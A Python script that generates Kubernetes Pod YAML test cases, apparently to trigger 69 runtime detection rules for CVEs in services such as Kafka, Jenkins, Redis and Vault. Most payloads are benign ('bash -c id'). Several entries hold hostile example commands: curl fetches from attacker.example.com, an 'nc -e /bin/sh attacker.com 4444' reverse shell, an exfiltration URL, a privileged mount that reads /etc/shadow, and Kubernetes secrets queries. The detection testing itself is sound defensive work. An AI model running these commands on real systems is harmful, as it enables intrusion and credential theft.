#!/usr/bin/env python3
"""Generate YAML files for 0.9.13_experimental rules."""

import os

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "yamls", "0.9.13_experimental")
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Each entry: (yaml_filename, comment, command_args)
# Pattern 1: actor_process spawns child -> cp /bin/bash <actor>; ./<actor> -c '<child_cmd>'; sleep infinity
# Pattern 2: process + cmd_line -> just run the command directly
# Pattern 3: actor_process + actor_process_cmd_line -> cp /bin/bash <actor>; ./<actor> <extra_args> -c '<child_cmd>'; sleep infinity

yamls = [
    # 1. Apache Airflow
    (
        "apache-airflow-edge-provider-rce-cve-2025-67895",
        "#command: airflow spawns shell/curl (CVE-2025-67895)\n#note: actor_process_name should be airflow for full rule match",
        'cp /bin/bash airflow; ./airflow -c \'bash -c id\'; sleep infinity'
    ),
    # 2. Apache HTTPD TLS Access Bypass
    (
        "apache-httpd-tls-access-bypass-cve-2025-23048",
        "#command: httpd spawns shell (CVE-2025-23048)\n#note: actor_process_name should be httpd/apache2 for full rule match",
        'cp /bin/bash httpd; ./httpd -c \'bash -c id\'; sleep infinity'
    ),
    # 3. Apache Kafka OAuth JNDI RCE
    (
        "apache-kafka-oauth-jndi-rce-cve-2025-27817",
        "#command: java (kafka) spawns curl (CVE-2025-27817)\n#note: actor_process_name should be java with kafka in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'curl http://attacker.example.com/payload.sh\' kafka; sleep infinity'
    ),
    # 4. Apache Solr RCE ConfigSet
    (
        "apache-solr-rce-configset-cve-2025-24814",
        "#command: java (solr) spawns curl (CVE-2025-24814)\n#note: actor_process_name should be java with solr in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'curl http://attacker.example.com/payload.sh\' solr; sleep infinity'
    ),
    # 5. Apache Tomcat Deserialization RCE
    (
        "apache-tomcat-deserialization-rce-cve-2025-24813",
        "#command: java (tomcat) spawns curl (CVE-2025-24813)\n#note: actor_process_name should be java with tomcat in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'curl http://attacker.example.com/payload.sh\' tomcat; sleep infinity'
    ),
    # 6. Apache Zookeeper Spawns Suspicious Process
    (
        "apache-zookeeper-spawns-suspicious-process",
        "#command: java (zookeeper) spawns shell (generic Zookeeper RCE)\n#note: actor_process_name should be java with zookeeper in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'bash -c id\' zookeeper; sleep infinity'
    ),
    # 7. ArgoCD API Unauthorized Access
    (
        "argocd-api-unauthorized-access-cve-2025-55190",
        "#command: argocd-server spawns shell (CVE-2025-55190)\n#note: actor_process_name should be argocd-server for full rule match",
        'cp /bin/bash argocd-server; ./argocd-server -c \'bash -c id\'; sleep infinity'
    ),
    # 8. Consul Spawns Suspicious Process
    (
        "consul-spawns-suspicious-process",
        "#command: consul spawns shell (generic Consul RCE)\n#note: actor_process_name should be consul for full rule match",
        'cp /bin/bash consul; ./consul -c \'bash -c id\'; sleep infinity'
    ),
    # 9. CoreDNS ACL Bypass TOCTOU
    (
        "coredns-acl-bypass-toctou-cve-2026-26017",
        "#command: dig resolves internal k8s service (CVE-2026-26017)\n#note: process_name should be dig with .svc.cluster.local in cmd_line",
        'dig kubernetes.default.svc.cluster.local; sleep infinity'
    ),
    # 10. CoreDNS Remote DoS
    (
        "coredns-remote-dos-cve-2026-26018",
        "#command: nmap targets DNS port 53 (CVE-2026-26018)\n#note: process_name should be nmap/hping3 with :53 or --udp in cmd_line",
        'nmap --udp -p 53 coredns; sleep infinity'
    ),
    # 11. CouchDB Spawns Suspicious Process
    (
        "couchdb-spawns-suspicious-process",
        "#command: beam.smp (CouchDB) spawns shell (generic CouchDB RCE)\n#note: actor_process_name should be beam.smp/couchdb for full rule match",
        'cp /bin/bash beam.smp; ./beam.smp -c \'bash -c id\'; sleep infinity'
    ),
    # 12. Docker Container Cryptominer Deployment
    (
        "docker-container-cryptominer-deployment-cve-2025-9074",
        "#command: xmrig cryptominer execution (CVE-2025-9074)\n#note: process_name should be xmrig or cmd_line should contain stratum+tcp://",
        'cp /bin/bash xmrig; ./xmrig -c \'echo stratum+tcp://pool.example.com\'; sleep infinity'
    ),
    # 13. Docker Container Escape Via Engine API
    (
        "docker-container-escape-via-engine-api-cve-2025-9074",
        "#command: docker run with privileged flag (CVE-2025-9074)\n#note: process_name should be docker with run + --privileged in cmd_line",
        'docker run --privileged -v /:/host alpine cat /host/etc/shadow; sleep infinity'
    ),
    # 14. Docker Model Runner Flag Injection
    (
        "docker-model-runner-flag-injection-cve-2026-28400",
        "#command: docker model with runtime flag injection (CVE-2026-28400)\n#note: process_name should be docker with model + --privileged in cmd_line",
        'docker model --privileged --runtime nvidia malicious-model; sleep infinity'
    ),
    # 15. Docker Unauthenticated Engine API Access
    (
        "docker-unauthenticated-engine-api-access-cve-2025-9074",
        "#command: curl to Docker Engine API port 2375 (CVE-2025-9074)\n#note: process_name should be curl with :2375 in cmd_line",
        'curl http://127.0.0.1:2375/containers/json; sleep infinity'
    ),
    # 16. Elasticsearch Spawns Suspicious Process
    (
        "elasticsearch-spawns-suspicious-process",
        "#command: java (elasticsearch) spawns shell (generic Elasticsearch RCE)\n#note: actor_process_name should be java with elasticsearch in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'bash -c id\' elasticsearch; sleep infinity'
    ),
    # 17. Envoy/Istio Request Smuggling
    (
        "envoy-istio-request-smuggling-cve-2025-66220",
        "#command: envoy spawns shell (CVE-2025-66220)\n#note: actor_process_name should be envoy/pilot-agent for full rule match",
        'cp /bin/bash envoy; ./envoy -c \'bash -c id\'; sleep infinity'
    ),
    # 18. Ghost CMS Spawns Suspicious Process
    (
        "ghost-cms-spawns-suspicious-process",
        "#command: node (ghost) spawns shell (generic Ghost CMS RCE)\n#note: actor_process_name should be node with ghost in cmd_line for full rule match",
        'cp /bin/bash node; ./node -c \'bash -c id\' ghost; sleep infinity'
    ),
    # 19. GitHub Actions Runner Spawns Suspicious Process
    (
        "github-actions-runner-spawns-suspicious-process",
        "#command: Runner.Listener spawns nc (GitHub Actions abuse)\n#note: actor_process_name should be Runner.Listener for full rule match",
        'cp /bin/bash Runner.Listener; ./Runner.Listener -c \'nc -e /bin/sh attacker.com 4444\'; sleep infinity'
    ),
    # 20. GitLab Runner Spawns Suspicious Process
    (
        "gitlab-runner-spawns-suspicious-process",
        "#command: gitlab-runner spawns curl (malicious pipeline abuse)\n#note: actor_process_name should be gitlab-runner for full rule match",
        'cp /bin/bash gitlab-runner; ./gitlab-runner -c \'curl http://attacker.example.com/payload.sh\'; sleep infinity'
    ),
    # 21. GitLab SAML Auth Bypass
    (
        "gitlab-saml-auth-bypass-cve-2025-25291",
        "#command: puma (GitLab) spawns shell (CVE-2025-25291/25292)\n#note: actor_process_name should be puma/sidekiq for full rule match",
        'cp /bin/bash puma; ./puma -c \'bash -c id\'; sleep infinity'
    ),
    # 22. Gitea Spawns Suspicious Process
    (
        "gitea-spawns-suspicious-process",
        "#command: gitea spawns shell (generic Gitea RCE)\n#note: actor_process_name should be gitea for full rule match",
        'cp /bin/bash gitea; ./gitea -c \'bash -c id\'; sleep infinity'
    ),
    # 23. Glibc DNS Memory Leak
    (
        "glibc-dns-memory-leak-cve-2026-0915",
        "#command: dig with PTR query for 0.0.0.0 (CVE-2026-0915)\n#note: process_name should be dig with -t PTR or 0.0.0.0 in cmd_line",
        'dig -t PTR 0.0.0.0; sleep infinity'
    ),
    # 24. Glibc Heap Corruption Memalign
    (
        "glibc-heap-corruption-memalign-cve-2026-0861",
        "#command: gdb with memalign in cmd_line (CVE-2026-0861)\n#note: process_name should be gdb/strace with memalign in cmd_line",
        'gdb -ex \'break memalign\' -ex run ./target_binary; sleep infinity'
    ),
    # 25. GoLang SSH Agent Malformed Identity DoS
    (
        "golang-ssh-agent-malformed-identity-dos-cve-2025-47914",
        "#command: ssh-add with SSH_AUTH_SOCK (CVE-2025-47914)\n#note: process_name should be ssh-add with SSH_AUTH_SOCK in cmd_line",
        'SSH_AUTH_SOCK=/tmp/ssh-agent.sock ssh-add add-identity /tmp/ssh-malformed-key; sleep infinity'
    ),
    # 26. GoLang SSH GSSAPI Memory Exhaustion
    (
        "golang-ssh-gssapi-memory-exhaustion-cve-2025-58181",
        "#command: sshd with gssapi in cmd_line (CVE-2025-58181)\n#note: process_name should be sshd with gssapi in cmd_line",
        'cp /bin/bash sshd; ./sshd -c \'echo gssapi-with-mic\'; sleep infinity'
    ),
    # 27. Grafana Enterprise Privilege Escalation
    (
        "grafana-enterprise-privilege-escalation-cve-2025-41115",
        "#command: grafana-server spawns shell (CVE-2025-41115)\n#note: actor_process_name should be grafana-server for full rule match",
        'cp /bin/bash grafana-server; ./grafana-server -c \'bash -c id\'; sleep infinity'
    ),
    # 28. HAProxy Spawns Suspicious Process
    (
        "haproxy-spawns-suspicious-process",
        "#command: haproxy spawns shell (generic HAProxy RCE)\n#note: actor_process_name should be haproxy for full rule match",
        'cp /bin/bash haproxy; ./haproxy -c \'bash -c id\'; sleep infinity'
    ),
    # 29. Harbor Registry Spawns Suspicious Process
    (
        "harbor-registry-spawns-suspicious-process",
        "#command: harbor-core spawns shell (generic Harbor RCE)\n#note: actor_process_name should be harbor-core for full rule match",
        'cp /bin/bash harbor-core; ./harbor-core -c \'bash -c id\'; sleep infinity'
    ),
    # 30. Java SE JSSE Access Control Bypass
    (
        "java-se-jsse-access-control-bypass-cve-2025-21587",
        "#command: java (javax.net.ssl) spawns shell (CVE-2025-21587)\n#note: actor_process_name should be java with javax.net.ssl or -jar in cmd_line",
        'cp /bin/bash java; ./java -c \'bash -c id\' -jar javax.net.ssl; sleep infinity'
    ),
    # 31. Jenkins Git Parameter Command Injection
    (
        "jenkins-git-parameter-command-injection-cve-2025-53652",
        "#command: java (jenkins) spawns shell (CVE-2025-53652)\n#note: actor_process_name should be java with jenkins in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'bash -c id\' jenkins; sleep infinity'
    ),
    # 32. Jetty Path Traversal RCE
    (
        "jetty-path-traversal-rce",
        "#command: java (jetty) spawns shell (Jetty path traversal RCE)\n#note: actor_process_name should be java with jetty in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'bash -c id\' jetty; sleep infinity'
    ),
    # 33. Keycloak Spawns Suspicious Process
    (
        "keycloak-spawns-suspicious-process",
        "#command: java (keycloak) spawns shell (generic Keycloak RCE)\n#note: actor_process_name should be java with keycloak in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'bash -c id\' keycloak; sleep infinity'
    ),
    # 34. Kibana Expr Eval RCE
    (
        "kibana-expr-eval-rce-cve-2025-12735",
        "#command: node (kibana) spawns shell (CVE-2025-12735)\n#note: actor_process_name should be node/kibana with kibana in cmd_line",
        'cp /bin/bash node; ./node -c \'bash -c id\' kibana; sleep infinity'
    ),
    # 35. Kibana Fleet Resource Exhaustion
    (
        "kibana-fleet-resource-exhaustion-cve-2026-0528",
        "#command: curl targets Kibana Fleet API (CVE-2026-0528)\n#note: process_name should be curl with /api/fleet/ or :5601 in cmd_line",
        'curl http://localhost:5601/api/fleet/agents; sleep infinity'
    ),
    # 36. Kibana Prototype Pollution Code Injection
    (
        "kibana-prototype-pollution-code-injection-cve-2024-12556",
        "#command: node/kibana spawns shell (CVE-2024-12556)\n#note: actor_process_name should be node/kibana for full rule match",
        'cp /bin/bash node; ./node -c \'bash -c id\'; sleep infinity'
    ),
    # 37. Kibana RCE Prototype Pollution
    (
        "kibana-rce-prototype-pollution-cve-2025-25015",
        "#command: node (kibana) spawns shell (CVE-2025-25015)\n#note: actor_process_name should be node/kibana with kibana or --server.host in cmd_line",
        'cp /bin/bash node; ./node -c \'bash -c id\' --server.host kibana; sleep infinity'
    ),
    # 38. Kubernetes API Server Token Theft
    (
        "kubernetes-api-server-token-theft",
        "#command: curl to kubernetes API with token (token theft)\n#note: process_name should be curl with kubernetes.default or /api/v1/ in cmd_line",
        'curl -k -H \"Authorization: Bearer token\" https://kubernetes.default/api/v1/secrets; sleep infinity'
    ),
    # 39. Kubernetes IngressNightmare RCE
    (
        "kubernetes-ingressnightmare-rce-cve-2025-1974",
        "#command: nginx-ingress-controller spawns shell (CVE-2025-1974)\n#note: actor_process_name should be nginx-ingress-controller/controller for full rule match",
        'cp /bin/bash nginx-ingress-controller; ./nginx-ingress-controller -c \'bash -c id\'; sleep infinity'
    ),
    # 40. Kubernetes Ingress Nginx Config Injection RCE
    (
        "kubernetes-ingress-nginx-config-injection-rce-cve-2026-24512",
        "#command: nginx spawns shell (CVE-2026-24512)\n#note: actor_process_name should be nginx/nginx-ingress-controller for full rule match",
        'cp /bin/bash nginx; ./nginx -c \'bash -c id\'; sleep infinity'
    ),
    # 41. Kubernetes Kubelet API Unauthorized Access
    (
        "kubernetes-kubelet-api-unauthorized-access",
        "#command: curl to Kubelet API port 10250 (Kubelet access)\n#note: process_name should be curl with :10250 or /pods in cmd_line",
        'curl -k https://node-ip:10250/pods; sleep infinity'
    ),
    # 42. MCP Server Command Injection
    (
        "mcp-server-command-injection-cve-2025-6514",
        "#command: mcp-server spawns shell (CVE-2025-6514)\n#note: actor_process_name should be mcp-server/mcp-remote for full rule match",
        'cp /bin/bash mcp-server; ./mcp-server -c \'bash -c id\'; sleep infinity'
    ),
    # 43. MCP Server Tool Poisoning Data Exfiltration
    (
        "mcp-server-tool-poisoning-data-exfiltration",
        "#command: curl exfiltrates data via MCP (tool poisoning)\n#note: process_name should be curl with mcp + http:// in cmd_line",
        'curl http://attacker.example.com/exfil?data=mcp_tool_call; sleep infinity'
    ),
    # 44. MariaDB JSON Schema Crash RCE
    (
        "mariadb-json-schema-crash-rce-cve-2026-32710",
        "#command: mysqld/mariadbd spawns shell (CVE-2026-32710)\n#note: actor_process_name should be mysqld/mariadbd for full rule match",
        'cp /bin/bash mysqld; ./mysqld -c \'bash -c id\'; sleep infinity'
    ),
    # 45. Memcached Unauthorized Access
    (
        "memcached-unauthorized-access",
        "#command: nc connects to Memcached port 11211 (unauthorized access)\n#note: process_name should be nc/telnet with :11211 in cmd_line",
        'nc memcached-host 11211; sleep infinity'
    ),
    # 46. MinIO Spawns Suspicious Process
    (
        "minio-spawns-suspicious-process",
        "#command: minio spawns shell (generic MinIO RCE)\n#note: actor_process_name should be minio for full rule match",
        'cp /bin/bash minio; ./minio -c \'bash -c id\'; sleep infinity'
    ),
    # 47. MongoDB MongoBleed Information Leak
    (
        "mongodb-mongobleed-information-leak-cve-2025-14847",
        "#command: mongod spawns shell/curl (CVE-2025-14847)\n#note: actor_process_name should be mongod/mongos for full rule match",
        'cp /bin/bash mongod; ./mongod -c \'bash -c id\'; sleep infinity'
    ),
    # 48. MongoDB Unauthorized Data Exfiltration
    (
        "mongodb-unauthorized-data-exfiltration-cve-2025-14847",
        "#command: mongodump with mongodb:// URI (CVE-2025-14847 post-exploit)\n#note: process_name should be mongodump with mongodb:// or --uri in cmd_line",
        'mongodump --uri mongodb://attacker:password@mongodb-host:27017 --out /tmp/dump; sleep infinity'
    ),
    # 49. MySQL Server Spawns Suspicious Process
    (
        "mysql-server-spawns-suspicious-process",
        "#command: mysqld spawns shell (generic MySQL RCE)\n#note: actor_process_name should be mysqld for full rule match",
        'cp /bin/bash mysqld_safe; cp /bin/bash mysqld; ./mysqld -c \'bash -c id\'; sleep infinity'
    ),
    # 50. NVIDIA Container Toolkit Suspicious Host Mount
    (
        "nvidia-container-toolkit-suspicious-host-mount-cve-2025-23266",
        "#command: nvidia-container-cli spawns shell (CVE-2025-23266)\n#note: actor_process_name should be nvidia-container-cli for full rule match",
        'cp /bin/bash nvidia-container-cli; ./nvidia-container-cli -c \'bash -c id\'; sleep infinity'
    ),
    # 51. Nexus Repository Spawns Suspicious Process
    (
        "nexus-repository-spawns-suspicious-process",
        "#command: java (nexus) spawns shell (generic Nexus RCE)\n#note: actor_process_name should be java with nexus in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'bash -c id\' nexus; sleep infinity'
    ),
    # 52. Nginx UI Spawns Shell Post Exploitation
    (
        "nginx-ui-spawns-shell-post-exploitation-cve-2026-27944",
        "#command: nginx-ui spawns shell (CVE-2026-27944)\n#note: actor_process_name should be nginx-ui for full rule match",
        'cp /bin/bash nginx-ui; ./nginx-ui -c \'bash -c id\'; sleep infinity'
    ),
    # 53. Odoo ERP Spawns Suspicious Process
    (
        "odoo-erp-spawns-suspicious-process",
        "#command: python (odoo) spawns shell (generic Odoo RCE)\n#note: actor_process_name should be python/odoo with odoo in cmd_line for full rule match",
        'cp /bin/bash odoo; ./odoo -c \'bash -c id\' odoo; sleep infinity'
    ),
    # 54. PHP-FPM Spawns Suspicious Process
    (
        "php-fpm-spawns-suspicious-process",
        "#command: php-fpm spawns shell (generic PHP-FPM RCE)\n#note: actor_process_name should be php-fpm for full rule match",
        'cp /bin/bash php-fpm; ./php-fpm -c \'bash -c id\'; sleep infinity'
    ),
    # 55. PostgreSQL COPY TO PROGRAM Execution
    (
        "postgresql-copy-to-program-execution-cve-2025-1094",
        "#command: psql executes COPY TO PROGRAM (CVE-2025-1094)\n#note: process_name should be psql with COPY and PROGRAM in cmd_line",
        'cp /bin/bash psql; ./psql -c \"COPY (SELECT 1) TO PROGRAM id\"; sleep infinity'
    ),
    # 56. PostgreSQL SQL Injection RCE
    (
        "postgresql-sql-injection-rce-cve-2025-1094",
        "#command: postgres spawns shell (CVE-2025-1094)\n#note: actor_process_name should be postgres/psql for full rule match",
        'cp /bin/bash postgres; ./postgres -c \'bash -c id\'; sleep infinity'
    ),
    # 57. RabbitMQ Erlang/OTP SSH RCE
    (
        "rabbitmq-erlang-otp-ssh-rce-cve-2025-32433",
        "#command: beam.smp (RabbitMQ) spawns shell (CVE-2025-32433)\n#note: actor_process_name should be beam.smp/rabbitmq-server for full rule match",
        'cp /bin/bash rabbitmq-server; ./rabbitmq-server -c \'bash -c id\'; sleep infinity'
    ),
    # 58. Redis Lua UAF RCE
    (
        "redis-lua-uaf-rce-cve-2025-49844",
        "#command: redis-server spawns shell (CVE-2025-49844)\n#note: actor_process_name should be redis-server for full rule match",
        'cp /bin/bash redis-server; ./redis-server -c \'bash -c id\'; sleep infinity'
    ),
    # 59. Redis Output Buffer DoS
    (
        "redis-output-buffer-dos-cve-2025-21605",
        "#command: redis-cli floods Redis port 6379 (CVE-2025-21605)\n#note: process_name should be redis-cli with :6379 or -p 6379 in cmd_line",
        'redis-cli -h redis-host -p 6379 PING; sleep infinity'
    ),
    # 60. Runc Masked Path Symlink Container Escape
    (
        "runc-masked-path-symlink-container-escape-cve-2025-31133",
        "#command: ln -s to /proc/sys/kernel/core_pattern (CVE-2025-31133)\n#note: process_name should be ln with -s and /proc/sys/kernel/core_pattern in cmd_line",
        'ln -s /proc/sys/kernel/core_pattern /dev/null; sleep infinity'
    ),
    # 61. Sentry Spawns Suspicious Process
    (
        "sentry-spawns-suspicious-process",
        "#command: python (sentry) spawns shell (generic Sentry RCE)\n#note: actor_process_name should be python/sentry with sentry in cmd_line for full rule match",
        'cp /bin/bash sentry; ./sentry -c \'bash -c id\' sentry; sleep infinity'
    ),
    # 62. SonarQube Scanner Code Execution
    (
        "sonarqube-scanner-code-execution-cve-2025-58178",
        "#command: java (sonarqube) spawns shell (CVE-2025-58178)\n#note: actor_process_name should be java with sonar in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'bash -c id\' sonar; sleep infinity'
    ),
    # 63. Spring Boot Actuator RCE
    (
        "spring-boot-actuator-rce",
        "#command: java (spring boot) spawns shell (Spring Boot Actuator RCE)\n#note: actor_process_name should be java with spring in cmd_line for full rule match",
        'cp /bin/bash java; ./java -c \'bash -c id\' spring boot; sleep infinity'
    ),
    # 64. Tekton Pipeline Resolver DoS
    (
        "tekton-pipeline-resolver-dos-cve-2026-33022",
        "#command: tekton-pipelines-controller spawns shell (CVE-2026-33022)\n#note: actor_process_name should be tekton-pipelines-controller for full rule match",
        'cp /bin/bash tekton-pipelines-controller; ./tekton-pipelines-controller -c \'bash -c id\'; sleep infinity'
    ),
    # 65. Traefik Spawns Suspicious Process
    (
        "traefik-spawns-suspicious-process",
        "#command: traefik spawns shell (generic Traefik RCE)\n#note: actor_process_name should be traefik for full rule match",
        'cp /bin/bash traefik; ./traefik -c \'bash -c id\'; sleep infinity'
    ),
    # 66. Varnish Cache Spawns Suspicious Process
    (
        "varnish-cache-spawns-suspicious-process",
        "#command: varnishd spawns shell (generic Varnish RCE)\n#note: actor_process_name should be varnishd for full rule match",
        'cp /bin/bash varnishd; ./varnishd -c \'bash -c id\'; sleep infinity'
    ),
    # 67. Vault Arbitrary Code Execution
    (
        "vault-arbitrary-code-execution-cve-2025-6000",
        "#command: vault spawns shell (CVE-2025-6000)\n#note: actor_process_name should be vault for full rule match",
        'cp /bin/bash vault; ./vault -c \'bash -c id\'; sleep infinity'
    ),
    # 68. Vault LDAP Auth Bypass
    (
        "vault-ldap-auth-bypass-cve-2025-13357",
        "#command: curl to Vault LDAP auth endpoint (CVE-2025-13357)\n#note: process_name should be curl with /v1/auth/ldap/ in cmd_line",
        'curl http://vault:8200/v1/auth/ldap/login/admin; sleep infinity'
    ),
    # 69. WordPress PHP Code Injection RCE
    (
        "wordpress-php-code-injection-rce-cve-2025-39601",
        "#command: php spawns shell (CVE-2025-39601)\n#note: actor_process_name should be php/php-fpm for full rule match",
        'cp /bin/bash php; ./php -c \'bash -c id\'; sleep infinity'
    ),
]

TEMPLATE = """{comment}

apiVersion: v1
kind: Pod
metadata:
  name: {name}
spec:
  restartPolicy: Never
  containers:
  - name: {name}
    image: angelrita/base-ubuntu:latest
    #imagePullPolicy: Never
    command: ['sh']
    args: ["-c", "{cmd}"]
"""

count = 0
for name, comment, cmd in yamls:
    filepath = os.path.join(OUTPUT_DIR, f"{name}.yaml")
    content = TEMPLATE.format(name=name, comment=comment, cmd=cmd)
    with open(filepath, "w", newline="\n") as f:
        f.write(content)
    count += 1

print(f"Generated {count} YAML files in {OUTPUT_DIR}")
